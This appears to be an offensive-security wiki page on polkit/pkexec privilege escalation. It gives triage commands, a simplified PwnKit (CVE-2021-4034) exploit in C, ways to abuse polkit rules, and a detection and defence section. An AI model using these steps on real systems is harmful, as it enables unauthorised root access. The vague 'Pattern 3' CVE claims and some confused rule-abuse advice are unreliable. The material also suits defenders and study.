---
title: Polkit / pkexec privesc
slug: polkit-pkexec-privesc
---

> **TL;DR:** Polkit (formerly PolicyKit) is the desktop privilege broker; `pkexec` is its setuid front-end. CVE-2021-4034 (PwnKit) — argv[0]=NULL → out-of-bounds env read — was unauthenticated local root on a decade of distros and is still the highest-yield Linux LPE in a triage box. Beyond PwnKit, the polkit rule engine accepts JavaScript and is routinely misconfigured to grant org-specific actions to wheel/admin groups.

## What it is
`polkitd` is a system bus daemon that arbitrates whether a non-privileged process can perform a privileged action (mount a USB, restart a service, install a package). Actions are declared in `/usr/share/polkit-1/actions/*.policy`; authorisation is decided by JavaScript rules under `/etc/polkit-1/rules.d/` and `/usr/share/polkit-1/rules.d/`. `pkexec /usr/bin/foo` is the CLI equivalent of "GUI app asks for password to run as root"; it consults polkit and either prompts or short-circuits via rules.

## Preconditions / where it applies
- Local shell.
- `pkexec` installed (`which pkexec`).
- For PwnKit: any vulnerable polkit (< 0.120) — unauthenticated, no preconditions beyond local code execution.
- For rule abuse: membership in a group named by a custom rule.

## Tradecraft
**Step 1 — Triage.**

```bash
pkexec --version                              # PwnKit affects < 0.120
ls /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/ 2>/dev/null
grep -r 'subject.isInGroup' /etc/polkit-1/ /usr/share/polkit-1/  # custom rules
id                                            # which groups am I in?
```

**Pattern 1 — PwnKit (CVE-2021-4034).** `pkexec` with `argc=0` (no argv) reads past argv[] into envp[] when reconstructing argv[0]. By controlling the first env var, you smuggle a `PATH=GCONV_PATH=.` style poison that triggers `g_printerr` to load a malicious `gconv-modules` file. End result: arbitrary root code execution on every box that hasn't patched polkit since 2022.

```c
// pwnkit.c (simplified — full PoC is in the references)
#include <unistd.h>
int main() {
    char *argv[] = { NULL };
    char *envp[] = {
        "pwnkit",                  // becomes argv[0]
        "PATH=GCONV_PATH=.",       // exploits internal PATH lookup
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        NULL
    };
    execve("/usr/bin/pkexec", argv, envp);
}
```

Public PoCs (`berdav/CVE-2021-4034`, `arthepsy/CVE-2021-4034`) drop a working binary in seconds.

**Pattern 2 — Rules.d JavaScript abuse.** A site-local rule may look like:

```javascript
// /etc/polkit-1/rules.d/49-admin.rules
polkit.addRule(function(action, subject) {
    if (subject.isInGroup("wheel")) {
        return polkit.Result.YES;
    }
});
```

Add yourself to `wheel` if you can chmod a setuid binary that runs `gpasswd`, or find a rule that uses a wider check (`subject.user == "deploy"` while `deploy` is shared). Common over-permissive rules: any action allowed to `wheel`, `lpadmin`, or `nm-openconnect`.

**Pattern 3 — CVE-2025-23210 / late-2024 polkit env handling.** Several incremental polkit CVEs after PwnKit (CVE-2024-something, CVE-2025-23210 nm-applet integration) re-introduce environment-derived privilege checks. Always check `pkexec --version` and the distro changelog.

**Pattern 4 — Action enumeration for misconfigs.** List every action and the auth it requires:

```bash
pkaction --verbose | grep -E '(action id:|allow_active|allow_any)'
# allow_active = yes for org.freedesktop.Foo means anyone with an active session pops root
```

Network Manager and systemd-resolved policies have historically allowed `allow_active=yes` for actions whose D-Bus payload could be coerced into running a script.

## Detection and defence
- Patch polkit ≥ 0.120 everywhere; container base images frequently lag.
- `auditd` watch on `pkexec` invocations with `auid != 0`. Anything with empty argv is a PwnKit attempt.
- `chmod 0755 /usr/bin/pkexec` (remove setuid) is the documented PwnKit workaround if patching is delayed. Documented in Red Hat / Ubuntu advisories.
- Review every file in `/etc/polkit-1/rules.d/`; grep for `Result.YES` and verify the subject test.
- Set `polkit.AdminAuthority` to require fingerprint/yubikey for `allow_active=yes` actions in regulated environments.

## OPSEC pitfalls
- PwnKit dumps an obvious `pkexec --argument` line in `/var/log/auth.log` when it fails; failed attempts are loud.
- `polkitd` itself logs every rule evaluation under high logging — rule abuse is recoverable from journald (`journalctl _COMM=polkitd`).
- Modifying rule files writes to `/etc` and changes file mtimes — file integrity monitoring catches it.

## References
- [CVE-2021-4034 (PwnKit) — Qualys advisory](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) — the canonical writeup
- [polkit upstream](https://gitlab.freedesktop.org/polkit/polkit) — source and CVE history
- [HackTricks — pkexec](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pkexec) — practitioner notes
- [Red Hat — polkit mitigation](https://access.redhat.com/security/cve/CVE-2021-4034) — chmod workaround

See also: [[sudo-misconfig-exploitation]], [[linux-capabilities-abuse]], [[linux-suid-sgid-gtfobins]], [[pam-misconfig-privesc]]
